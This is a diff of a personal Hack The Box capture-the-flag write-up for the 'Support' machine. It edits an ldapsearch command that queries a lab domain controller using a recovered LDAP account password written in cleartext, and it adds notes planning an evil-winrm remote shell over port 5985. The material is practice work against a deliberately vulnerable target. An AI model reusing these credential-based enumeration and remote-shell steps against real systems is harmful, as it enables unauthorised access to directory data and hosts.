@@ -66,9 +66,19 @@ Archive:  UserInfo.exe.zip
 #we got encryted password along with encryption techniq
 #based on encryted techniq create script python script to decrypt password
 
-┌──(root㉿kali)-[/home/kali/htb-writeups]
-└─# ldapsearch -x -H ldap://10.10.11.174 \
-  -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-  -b 'DC=support,DC=htb'
 
-#save output in saprate file for laters anylisis
+
+┌──(blackdevil㉿kali)-[~/htb-writeups]
+└─$ ldapsearch -x -H ldap://10.10.11.174 \
+-D 'support\ldap' \
+-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
+-b 'dc=support,dc=htb' \
+"(cn=support)"
+
+#port 5985 is open so we can possibly get intrective shell we will tool :evil-winrm
+#Evil-WinRM is a post-exploitation tool used by attackers or penetration testers to get an interactive PowerShell shell on a remote Windows machine using WinRM (Windows Remote Management).
+
+
+
+
+
